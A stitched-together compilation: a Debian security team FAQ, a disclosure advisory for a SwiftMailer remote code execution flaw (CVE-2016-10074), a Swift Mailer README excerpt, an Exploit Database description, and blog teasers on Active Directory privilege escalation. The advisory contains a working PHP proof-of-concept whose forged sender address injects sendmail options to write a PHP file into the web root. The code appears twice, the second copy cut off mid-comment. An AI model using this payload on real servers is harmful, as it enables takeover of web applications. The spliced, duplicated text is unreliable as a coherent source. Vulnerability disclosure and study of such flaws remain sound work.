Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

Vulnerability:
SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)

Discovered by: Dawid Golunski (@dawid_golunski)
<https://legalhackers.com>

Severity: CRITICAL

Desc:

An independent research uncovered a critical vulnerability in SwiftMailer that
could potentially be used by (unauthenticated) remote attackers to achieve
remote arbitrary code execution in the context of the web server user and
remotely compromise the target web application.

To exploit the vulnerability an attacker could target common website
components such as contact/feedback forms, registration forms, password
email resets and others that send out emails with the help of a vulnerable
version of the SwiftMailer class.

Despite the significant efforts in responsibly disclosing the vulnerability
to the vendor (since 2nd December).
The vulnerability remains unfixed as of 28 December.

The full advisory at:

<http://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html>

The Video PoC will be very similar to:

=============================================
- Discovered by: Dawid Golunski

- CVE-2016-10074
- Release date:  30.12.2016
- Last revision: 29.12.2016
- Revision 3.0
- Severity: Critical
=============================================

I. VULNERABILITY
-------------------------

SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)

II. BACKGROUND
-------------------------

"Swift Mailer is a component-based library for sending e-mails from PHP applications."

"Swift Mailer began back in 2005 as a one-class project for sending mail over SMTP.
It has since grown into the flexible component-based library that is in development today."

SwiftMailer library is used by major PHP projects including some of the
most popular PHP programming frameworks such as Yii2, Laravel, Symfony.

<https://github.com/swiftmailer/swiftmailer/blob/5.x/doc/introduction.rst>
<https://github.com/swiftmailer/swiftmailer/blob/5.x/doc/overview.rst>

Symfony / Yii / Laravel frameworks:

<http://symfony.com/doc/current/email.html>

<https://github.com/yiisoft/yii2-swiftmailer>

<https://laravel.com/docs/5.1/mail>

III. INTRODUCTION
-------------------------

An independent research uncovered a critical vulnerability in SwiftMailer that
could potentially be used by (unauthenticated) remote attackers to achieve
remote arbitrary code execution in the context of the web server user and
remotely compromise the target web application.

To exploit the vulnerability an attacker could target common website
components such as contact/feedback forms, registration forms, password
email resets and others that send out emails with the help of a vulnerable
version of the SwiftMailer class.

Update (29.12): Vendor has released the patch in version 5.4.5.

Note: This advisory is limited.
Remaining attack vectors/exploits will be disclosed at a later date to allow
more time for patching.

IV. DESCRIPTION
-------------------------

SwiftMailer class uses PHP mail() function as its default transport.

SwiftMailer suffers from the same vulnerability as the one disclosed in
PHPMailer in the advisory at:

<http://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10033-Vuln.html>

The following Sender address:

"Attacker -Param2 -Param3"@test.com

would cause SwiftMailer/mail() function to execute /usr/bin/sendmail with the
following list of arguments:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker -Param2 -Param3@test.com]

which would not work for the attacker (Param2 and Param3 are passed within
the same argument of argv[3] )

Attackers can however break out of parameter no.3 with some extra escaping.

For example, by injecting an extra sequence of \" after the first argument,
the following Sender email:

"Attacker \" -Param2 -Param3"@test.com

when passed to SwiftMailer (and eventually to mail()) function would cause
sendmail to execute with:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fAttacker\]
Arg no. 4 == [-Param2]
Arg no. 5 == [-Param3"@test.com]

Which as can be seen would inject additional parameters of 4 & 5 to sendmail.

Attackers can exploit this to achieve code execution as shown in the PoC
below.

V. PROOF OF CONCEPT EXPLOIT
-------------------------

<?php

/*

SwiftMailer <= 5.4.5-DEV Remote Code Execution (CVE-2016-10074)

Discovered/Coded by:

Dawid Golunski
<https://legalhackers.com>

Full Advisory URL:
<https://legalhackers.com/advisories/SwiftMailer-Exploit-Remote-Code-Exec-CVE-2016-10074-Vuln.html>

Video PoC
<https://legalhackers.com/videos/PHPMailer-Exploit-Remote-Code-Exec-Vuln-CVE-2016-10033-PoC.html>

Follow the feed for updates:

<https://twitter.com/dawid_golunski>

A simple PoC (working on Sendmail MTA)

It will inject the following parameters to sendmail command:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fattacker\]
Arg no. 4 == [-oQ/tmp/]
Arg no. 5 == [-X/var/www/cache/phpcode.php]
Arg no. 6 == ["@email.com]

which will write the transfer log (-X) into /var/www/cache/phpcode.php file.
Note /var/www/cache must be writable by www-data web user.

The resulting file will contain the payload passed in the body of the msg:

09607 <<< Content-Type: text/html; charset=us-ascii
09607 <<<
09607 <<< <?php phpinfo(); ?>
09607 <<<
09607 <<<
09607 <<<

See the full advisory URL for the exploit details.

*/

// Attacker's input coming from untrusted source such as $_GET , $_POST etc.
// For example from a Contact form with sender/body fields

$email_from = '"attacker\" -oQ/tmp/ -X/var/www/cache/phpcode.php "@email.com';
$msg_body = '<?php phpinfo(); ?>';

// ------------------

// mail() param injection via the vulnerability in SwiftMailer

require_once 'lib/swift_required.php';
// Mail transport
$transport = Swift_MailTransport::newInstance();
// Create the Mailer using your created Transport
$mailer = Swift_Mailer::newInstance($transport);

// Create a message
$message = Swift_Message::newInstance('Swift PoC exploit')
  ->setFrom(array($email_from => 'PoC Exploit Payload'))
  ->setTo(array('receiver@domain.org', 'other@domain.org' => 'A name'))
  ->setBody($msg_body);
// Send the message with PoC payload in 'from' field
$result = $mailer->send($message);

VI. BUSINESS IMPACT
-------------------------

A successful exploitation could let remote attackers to gain access to
the target server in the context of the web server account which could
lead to a full compromise of the web application.

VII. SYSTEMS AFFECTED
-------------------------

All versions of SwiftMailer including the latest of 5.4.5-DEV are affected.

Update (29.12): Vendor has released the patch in version 5.4.5.

VIII. SOLUTION / VENDOR RESPONSE
-------------------------

The vulnerability was responsibly disclosed to SwiftMailer vendor.
The first contact attempts started on the 2nd of December.
Unfortunatelly the vendor has not fixed the SwiftMailer library to date and
the library remains vulnerable in its latest version (5.4.5-dev).
Because of this, users of SwiftMailer (which includes various frameworks that make
use of the library) remain at risk.

The vendor was advised by the researcher of the upcoming exploit for another
library (PHPMailer) which when published by the vendor/researcher, would make
it possible for malicious users to "connect the dots" and use the same vectors/payloads
to attack SwiftMailer users as they are almost identical.

The last attempt of contact (resending the tested PoC exploit) was made on Dec 26th
to which the vendor have not replied and little action seems to have been taken.

As after the publication of PHPMailer exploit and patches other users on the Internet
did start to see the similarities and file public vulnerability reports, there is no
more point in keeping this advisory private. Keeping it private would only give
more advantage to potential attackers.

CVE MITRE assigned the following ID to this vulnerability:

CVE-2016-10074

Update (29.12): Vendor has released the patch in version 5.4.5.

## Swift Mailer

**Swiftmailer will stop being maintained at the end of November 2021.**

Please, move to [Symfony Mailer](https://symfony.com/doc/current/mailer.html) at your earliest convenience.
[Symfony Mailer](https://symfony.com/doc/current/mailer.html) is the next evolution of Swiftmailer.
It provides the same features with support for modern PHP code and support for third-party providers.

Swift Mailer is a component based mailing solution for PHP.
It is released under the MIT license.

Swift Mailer is highly object-oriented by design and lends itself
to use in complex web application with a great deal of flexibility.

For full details on usage, read the [documentation](https://swiftmailer.symfony.com/docs/introduction.html).

https://twitter.com/dawid_golunski

A simple PoC (working on Sendmail MTA)

It will inject the following parameters to sendmail command:

Arg no. 0 == [/usr/sbin/sendmail]
Arg no. 1 == [-t]
Arg no. 2 == [-i]
Arg no. 3 == [-fattacker\]
Arg no. 4 == [-oQ/tmp/]
Arg no. 5 == [-X/var/www/cache/phpcode.php]
Arg no. 6 == ["@email.com]

which will write the transfer log (-X) into /var/www/cache/phpcode.php file.
Note /var/www/cache must be writable by www-data web user.

The resulting file will contain the payload passed in the body of the msg:

09607 <<< Content-Type: text/html; charset=us-ascii
09607 <<<
09607 <<< <?php phpinfo(); ?>
09607 <<<
09607 <<<
09607 <<<

See the full advisory URL for the exploit details.

*/

// Attacker's input coming from untrusted source such as $_GET , $_POST etc.
// For example from a Contact form with sender field

$email_from = '"attacker\" -oQ/tmp/ -X/var/www/cache/phpcode.php "@email.com';

// ------------------

// mail() param injection via the vulnerability in SwiftMailer

require_once 'lib/swift_required.php';
// Mail transport
$transport = Swift_MailTransport::newInstance();
// Create the Mailer using your created Transport
$mailer = Swift_Mailer::newInstance($transport);

// Create a message
$message = Swift_Message::newInstance('Swift PoC exploit')
  ->setFrom(array($email_from => 'PoC Exploit Payload'))
  ->setTo(array('receiver@domain.org', 'other@domain.org' => 'A name'))
  ->setBody('Here is the message itself')
  ;
// Send the message with PoC payload in 'from' field
$result = $mailer->send($message);

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

12 May 2021

Hello,

Glad to see you in this second part of this [post](https://phackt.com/dnsadmins-group-exploitation-write-permissions). In our previous [article](https://phackt.com/dnsadmins-group-exploitation-write-permissions) we showed which rights were involved in the DnsAdmins privilege escalation. Now let’s talk about how to properly mitigate this.

# [Why DnsAdmins privilege escalation is still working ?](https://phackt.com/dnsadmins-group-exploitation-write-permissions)

22 Apr 2021

Hello,

In this article, first part of a serie, i’m talking about **DnsAdmins** and why this is a group you should take care of. I know that several articles talk about the privilege escalation (DNS service running on a domain controller and loading an arbitrary DLL).

We will quickly review this attack, but mainly i would rather focus on why it is still working nowadays, which permissions do you need to run this attack. I will conclude in a second part with the mitigations which can be implemented to prevent this attack.

# [Kerberos constrained delegation with protocol transition](https://phackt.com/en-kerberos-constrained-delegation-with-protocol-transition)

27 Nov 2020

Hello,

Today, we are talking about the exploitation of Kerberos protocol extensions [S4U2Self](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13) and [S4U2Proxy](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a) in order to impersonate a privileged user of the domain.

This post aims at focusing on the [Kerberos constrained delegation with protocol transition](https://docs.microsoft.com/fr-fr/previous-versions/windows/it-pro/windows-server-2003/cc739587%28v%3Dws.10%29) which we will shorten `T2A4D` (**TrustedToAuthForDelegation**); how to enumerate it, how to exploit it and use it as a method of persistence.

# [SecurityTube Advanced Red Team Lab training - Worth it ?](https://phackt.com/securitytube-redteam-labs-invoke-recon)

22 Sep 2020

Quick answer: **Totally** !

Hello everybody,

I would like to talk a bit about the [SecurityTube red team labs](https://www.pentesteracademy.com/redlabs), specifically the [Advanced Red Team Lab](https://www.pentesteracademy.com/redteamlab) which leads to the **CRTE** (Certified Red Team Expert) certification. *P.S: i’m not affiliated with securitytube*.

Some great [reviews](https://www.google.com/search?q=review+red+team+lab+pentester+academy+%22CRTE%22) are already existing, so i will focus on why i chose this lab and certification. I will give you some hints about how to approach your targets. Most importantly, i would like to introduce you a tool that i developped which will help you during your journey, [Invoke-Recon](https://github.com/phackt/Invoke-Recon).
